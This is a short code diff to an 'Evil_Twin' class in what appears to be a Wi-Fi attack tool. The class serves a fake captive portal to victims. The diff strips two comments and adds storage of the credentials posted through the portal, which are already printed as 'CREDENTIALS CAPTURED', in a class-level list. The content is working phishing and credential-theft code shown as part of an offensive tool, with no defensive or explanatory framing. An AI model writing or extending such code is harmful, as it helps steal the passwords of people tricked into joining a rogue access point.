@@ -2519,7 +2519,7 @@ class Evil_Twin():
                 self.end_headers()
                 return
 
-            # Serve files from portal directory
+
             try:
                 if self.path == '/' or self.path == '':
                     file_path = 'index.html'
@@ -2535,7 +2535,7 @@ class Evil_Twin():
                     with open('index.html', 'rb') as f:
                         content = f.read()
 
-                # Set content type
+
                 if file_path.endswith('.html'):
                     content_type = 'text/html'
                 elif file_path.endswith('.css'):
@@ -2568,7 +2568,7 @@ class Evil_Twin():
 
                 try:
                     data = json.loads(post_data.decode('utf-8'))
-                    console.print(f"[bold red][!] CREDENTIALS CAPTURED:[bold yellow] {data}")
+                    console.print(f"[bold red][!] CREDENTIALS CAPTURED:[bold yellow] {data}"); Evil_Twin.creds.append(data)
                 except: pass
 
                 self.send_response(200)
@@ -2597,7 +2597,8 @@ class Evil_Twin():
     def main(cls):
         """This will control class wide logic"""
 
-
+        
+        cls.creds = []
         
         try:
 
